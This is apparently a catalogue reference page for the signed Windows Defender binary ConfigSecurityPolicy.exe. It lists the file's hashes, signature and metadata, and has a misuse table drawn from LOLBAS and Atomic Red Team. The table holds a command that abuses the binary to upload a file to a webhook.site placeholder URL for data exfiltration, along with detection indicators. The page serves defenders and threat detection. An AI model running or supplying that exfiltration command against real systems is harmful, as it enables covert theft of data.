﻿---
title: ConfigSecurityPolicy.exe | Microsoft Security Client Policy Configuration Tool
excerpt: What is ConfigSecurityPolicy.exe?
---

# ConfigSecurityPolicy.exe 

* File Path: `C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2003.8-0\ConfigSecurityPolicy.exe`
* Description: Microsoft Security Client Policy Configuration Tool

## Hashes

Type | Hash
-- | --
MD5 | `83EDE17A1087F8D5779A6C023B5B490A`
SHA1 | `26C25BF7E2877EF97B7E988B6CFB195C93A872F0`
SHA256 | `64A0E472574FD0DF31F83ABEB78FB253FBFA61FA06F69286CD84989B88E0EDF4`
SHA384 | `505ADF0766A5A08464B90F233DAC8DB1F28D45D6785317CA027361438E02410A48542927CDC201B00FDF7E75188DAB3A`
SHA512 | `CC42ECEB12344407706456E1C8FE3D7A8394BE93ABDBB72DC18E12E1D6B161F75E2CC97E99F3A5DAEE430DB072067567F18BE6D8D2F2301CCE2B59309614D66B`
SSDEEP | `6144:5M4pWq00rPuUVh+pBLW+1b46zdscUsox6xC:bWqluULJi46zds5sC`

## Runtime Data

### Usage (stderr):
```cmhg
Microsoft Security Client failed to apply policy "-help". Error code: 0xC00CE225.

```

## Signature

* Status: Signature verified.
* Serial: `33000001733031072665B8B9B3000000000173`
* Thumbprint: `14590DC5C3AAF238FCFD7785B4B93F4071402C34`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: ConfiguSecurityPolicy.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 4.10.14393.1198 (rs1_release_sec.170427-1353)
* Product Version: 4.10.14393.1198
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `ConfigSecurityPolicy.exe` being misused. While `ConfigSecurityPolicy.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `Name: ConfigSecurityPolicy.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- Command: ConfigSecurityPolicy.exe C:\\Windows\\System32\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- IOC: ConfigSecurityPolicy storing data into alternate data streams.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- IOC: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: Data Exfiltration with ConfigSecurityPolicy [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: Data Exfiltration with ConfigSecurityPolicy [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | - [Atomic Test #1 - Data Exfiltration with ConfigSecurityPolicy](#atomic-test-1---data-exfiltration-with-configsecuritypolicy) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | ## Atomic Test #1 - Data Exfiltration with ConfigSecurityPolicy | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | Exfiltration of data using ConfigSecurityPolicy.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | $path = resolve-path "c:\ProgramData\Microsoft\Windows Defender\Platform\*\ConfigSecurityPolicy.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


